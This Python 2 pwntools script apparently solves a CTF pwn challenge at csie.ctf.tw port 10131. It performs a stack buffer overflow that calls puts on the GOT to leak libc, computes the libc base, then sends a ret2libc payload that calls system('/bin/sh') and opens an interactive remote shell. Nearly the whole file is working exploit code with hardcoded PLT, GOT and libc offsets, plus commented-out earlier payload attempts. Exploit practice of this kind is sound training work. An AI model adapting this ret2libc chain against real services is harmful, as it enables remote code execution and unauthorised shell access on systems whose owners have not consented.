# at least need 33 bytes QAQ
import time

from pwn import *

def the_len():

    return int((time.time() - 1456113600) / 0x2710)

def get_payload_len():

    return cyclic(100).find(p32(0x66616161)) - 1

if __debug__:
    print 'remote'
#    r = remote("127.0.0.1", 10131)
    r = remote("csie.ctf.tw", 10131)

    libc = ELF('./libc.so.6-5c970fb93a8f7f9927e96057a860d06e')
    puts_plt = 0x8048410
    printf_plt = 0x80483e0
    time_got = 0x804a014
    puts_got = 0x804a01c
    main = 0x80485e6
    ret = 0x8048667
    libc_bin_sh_off = 0x15da80
else:
    print 'local'
    r = remote("127.0.0.1", 10131)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    puts_plt = 0x8048410
    printf_plt = 0x80483e0
    time_got = 0x804a014
    puts_got = 0x804a01c
    main = 0x80485e6
    ret = 0x8048667
    libc_bin_sh_off = 0x160a24

time_off = libc.symbols['time']
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
gets_off = libc.symbols['gets']

len_addr = 0x804a048

r.recvrepeat(0.5)

'''
raw_input()
r.send(#'A' * 12 + # it works, wait until the server allows 25~26 bytes!
        '\x00' * get_payload_len() +
        '\x00' +
        p32(0xdeadbeaf) +
        '\n'
)

print r.recvline()
temp = r.recvrepeat(0.5)
print temp
got_bin = temp[:4]
addr_actual = u32(got_bin)
print 'fuck'
print hex(u32(got_bin))
import sys
sys.exit(1)
'''

print get_payload_len()
raw_input()
payload = ('\x00' * get_payload_len() +
            '\x00' +
            p32(puts_plt) + # cover main()'s retaddr with puts_plt addr
#            p32(0xdeadbeef)  # the retaddr of puts
#            p32(0xbeefdead) +
            p32(main) +
#            p32(time_got) # we want to leak the actual address of time, which is stored in time_got
            p32(puts_got) # we want to leak the actual address of time, which is stored in time_got
)
r.send(payload + '\n')
r.recvline() # trash
temp = r.recvrepeat(0.5)
got_bin = temp[:4]
addr_actual = u32(got_bin)
base = addr_actual - puts_off
print "Libc base : " + hex(base)

system = base + system_off
gets = base + gets_off
bin_sh_addr = base + libc_bin_sh_off
'''
r.send(  p32(ret) * 5 +
#        p32(system) +
        p32(0xdeadbeaf) +
#        p32(bin_sh_addr) +
        '\n'
)
'''
r.send( '\x00' * (cyclic(29).find(p32(0x66616161))) +
        p32(system) +
        p32(0xdeadbeef) +
        p32(bin_sh_addr) +
        '\n'
)
print r.recvrepeat(0.5)

r.interactive()
